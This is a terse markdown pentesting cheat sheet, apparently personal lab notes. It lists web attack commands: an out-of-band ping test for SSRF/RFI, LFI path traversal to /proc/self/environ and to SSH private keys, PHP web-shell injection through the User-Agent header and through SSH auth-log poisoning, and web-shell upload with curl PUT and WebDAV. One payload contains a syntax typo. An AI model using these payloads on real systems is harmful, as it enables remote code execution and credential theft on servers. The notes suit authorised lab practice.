### check for ssrf or RFI 

```
kali
sudo tcpdump icmp -i tun0

Webserver
python3 <webserver-url> -c "ping -c4 <attacker-ip>"
``` 

### LFI
```
file=../../../../../proc/self/environ

change user-agent: <?php system[$_GET['cmd']); ?>

<url>/console?file=../../../../../proc/self/environ?cmd=id
```
```
/home/user/.ssh/id_rsa
/var/log/auth.log
try ssh poisinong
nc -nv <ip> 22
omgthissofun/<?php passthru($_GET['cmd']); ?>          # this will refeclt in /var/log/auth.log
```
### PDF to text 
```
pdftotext *.pdf
```

### PUT 
```
 curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.ph
```

### Webdav
```
cadaver http://192.168.1.103/dav/
 put /tmp/shell.php
```
